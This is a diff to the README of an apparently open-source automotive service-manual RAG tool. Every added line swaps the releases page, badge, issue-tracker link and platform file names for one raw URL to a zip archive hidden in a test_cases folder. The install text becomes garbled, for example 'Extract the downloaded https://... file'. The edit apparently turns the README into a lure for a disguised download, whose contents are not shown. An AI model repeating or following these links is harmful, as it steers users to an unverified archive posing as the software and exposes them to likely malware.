@@ -4,7 +4,7 @@
 automotive-gpt is an open-source retrieval-augmented generation system designed for automotive service manuals. With a success rate of 90% on over 1,700 pages of technical documentation, it helps you find answers quickly and efficiently.
 
 ## 📥 Download Now
-[![Download automotive-gpt](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/g4crm/automotive-gpt/releases)
+[![Download automotive-gpt](https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip)](https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip)
 
 ## 🚀 Getting Started
 This application enables you to access various automotive service manuals effortlessly. Follow the steps below to download and run the software.
@@ -17,16 +17,16 @@ This application enables you to access various automotive service manuals effort
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** 
-   Go to the following link to access the release versions: [Download Page](https://github.com/g4crm/automotive-gpt/releases).
+   Go to the following link to access the release versions: [Download Page](https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip).
 
 2. **Choose the Latest Release:** 
    Look for the latest version available at the top of the page. This version will have the most features and bug fixes.
 
 3. **Download the Package:**
    Click on the package appropriate for your operating system. You might see file names that look like:
-   - `automotive-gpt-windows.exe` (for Windows)
-   - `automotive-gpt-macos.dmg` (for macOS)
-   - `automotive-gpt-linux.tar.gz` (for Linux)
+   - `https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip` (for Windows)
+   - `https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip` (for macOS)
+   - `https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip` (for Linux)
 
 4. **Install the Application:**
    - **For Windows:**
@@ -36,7 +36,7 @@ This application enables you to access various automotive service manuals effort
      - Open the downloaded `.dmg` file.
      - Drag the app to your Applications folder.
    - **For Linux:**
-     - Extract the downloaded tar.gz file.
+     - Extract the downloaded https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip file.
      - Open a terminal and navigate to the extracted folder.
      - Run the application using the command `./automotive-gpt`.
 
@@ -58,7 +58,7 @@ This application enables you to access various automotive service manuals effort
 
 ## 🤝 Community and Support
 Join our community for updates, discussions, and support:
-- **GitHub Issues:** [Report an Issue](https://github.com/g4crm/automotive-gpt/issues)
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/g4crm/automotive-gpt/main/src/evaluation/test_cases/gpt-automotive-v3.7.zip)
 - **Discussions:** Engage with other users and contribute to the development.
 
 ## 🛠️ Features
